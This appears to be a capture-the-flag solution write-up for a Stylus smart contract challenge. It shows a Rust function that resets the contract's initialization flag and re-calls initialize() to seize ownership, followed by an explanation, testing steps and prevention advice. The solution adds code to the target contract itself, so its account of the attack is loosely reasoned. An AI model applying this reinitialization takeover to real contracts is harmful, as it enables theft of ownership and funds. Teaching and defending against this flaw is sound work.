# Storage Takeover Challenge Solution

## Challenge Overview
This challenge tests your understanding of Stylus smart contract storage manipulation and initialization patterns.

## Solution Steps

1. Add the following code to the `VulnerableContract` implementation:
```rust
pub fn exploit(&mut self) {
    // Reset the initialized flag to 0
    self.initialized.set(U256::from(0));
    
    // Call initialize to become the new owner
    self.initialize();
}
```

## Key Concepts
- The contract uses two storage slots:
  - Slot 0: owner (StorageU256)
  - Slot 1: initialized (StorageU256)
- The vulnerability lies in the initialization check
- By resetting the initialized flag, we can trigger reinitialization

## Explanation
1. `self.initialized.set(U256::from(0))` resets the initialization flag
2. `self.initialize()` sets us as the new owner since initialized is now 0
3. The contract's ownership is transferred to us through reinitialization

## Testing
1. Deploy the contract
2. Call the exploit function
3. Verify that msg.sender is now the owner

## Prevention
To prevent this vulnerability:
- Use proper initialization patterns
- Add access controls to storage modifications
- Consider using OpenZeppelin's Initializable pattern
